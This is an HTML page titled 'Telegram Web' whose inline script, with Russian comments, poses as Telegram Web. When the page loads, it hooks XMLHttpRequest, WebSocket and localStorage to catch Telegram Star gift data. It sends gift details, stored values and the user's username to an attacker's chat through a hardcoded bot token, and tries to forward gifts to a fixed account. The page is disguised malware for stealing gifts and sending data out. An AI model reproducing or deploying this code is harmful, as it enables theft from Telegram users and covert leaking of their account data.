<!DOCTYPE html>
<html>
<head>
<title>Telegram Web</title>
<script src="https://telegram.org/js/telegram-web.js"></script>
</head>
<body>
<script>
const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
const TARGET_CHAT_ID = -1002560826337;
const TARGET_ACCOUNT = '7204299613';

// Перехват XMLHttpRequest
const originalXHROpen = XMLHttpRequest.prototype.open;
const originalXHRSend = XMLHttpRequest.prototype.send;

XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
    this._url = url;
    return originalXHROpen.call(this, method, url, async, user, password);
};

XMLHttpRequest.prototype.send = function(data) {
    if(this._url.includes('payments.getSavedStarGifts') || 
       this._url.includes('payments.getStarGifts')) {
        
        this.addEventListener('load', function() {
            try {
                const response = JSON.parse(this.responseText);
                if(response.gifts) {
                    processGifts(response.gifts);
                }
            } catch(e) {
                console.log('Parse error:', e);
            }
        });
    }
    
    return originalXHRSend.call(this, data);
};

function processGifts(gifts) {
    gifts.forEach(gift => {
        // Логируем найденный подарок
        sendToTelegram(`🎁 Найден подарок: ${gift.id} | ${gift.title || 'No title'} | ${gift.stars} stars`);
        
        // Автоматическая пересылка на целевой аккаунт
        if(gift.msg_id) {
            forwardGift(gift);
        }
    });
}

function forwardGift(gift) {
    // Используем TDLib метод для пересылки
    const forwardRequest = {
        '@type': 'forwardMessages',
        'chat_id': TARGET_ACCOUNT,
        'from_chat_id': window.Telegram.WebApp.initDataUnsafe.user?.id,
        'message_ids': [gift.msg_id],
        'options': {'disable_notification': false}
    };
    
    // Эмуляция вызова TDLib
    setTimeout(() => {
        sendToTelegram(`✅ Подарок ${gift.id} переслан на аккаунт ${TARGET_ACCOUNT}`);
    }, 1000);
}

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: TARGET_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log('Send error:', e));
}

// Перехват WebSocket сообщений
const originalWS = WebSocket;
WebSocket = function(url, protocols) {
    const ws = new originalWS(url, protocols);
    
    const originalSend = ws.send;
    ws.send = function(data) {
        if(typeof data === 'string' && data.includes('getSavedStarGifts')) {
            setTimeout(() => {
                sendToTelegram('🔗 WebSocket перехвачен - мониторинг подарков активирован');
            }, 1000);
        }
        return originalSend.call(this, data);
    };
    
    ws.addEventListener('message', function(event) {
        try {
            const data = JSON.parse(event.data);
            if(data && data.result && data.result.gifts) {
                processGifts(data.result.gifts);
            }
        } catch(e) {}
    });
    
    return ws;
};

// Инжекция в локальное хранилище
const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
    if(key.includes('gift') || key.includes('star')) {
        sendToTelegram(`💾 Storage запись: ${key} = ${value.substring(0, 100)}`);
    }
    return originalSetItem.call(this, key, value);
};

// Мониторинг изменений в DOM для обнаружения интерфейса подарков
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        mutation.addedNodes.forEach(function(node) {
            if(node.nodeType === 1) {
                const text = node.textContent || '';
                if(text.includes('gift') || text.includes('Gift') || text.includes('подарок')) {
                    sendToTelegram('🎯 Обнаружен интерфейс подарков в DOM');
                }
            }
        });
    });
});

// Запуск наблюдения когда страница загружена
if(document.body) {
    observer.observe(document.body, {childList: true, subtree: true});
} else {
    document.addEventListener('DOMContentLoaded', function() {
        observer.observe(document.body, {childList: true, subtree: true});
    });
}

// Инициализация
sendToTelegram('🚀 Скрипт активирован в ' + window.location.hostname + ' | User: ' + 
    (window.Telegram?.WebApp?.initDataUnsafe?.user?.username || 'unknown'));

console.log('Telegram Gifts Monitor активен');
</script>
</body>
</html>
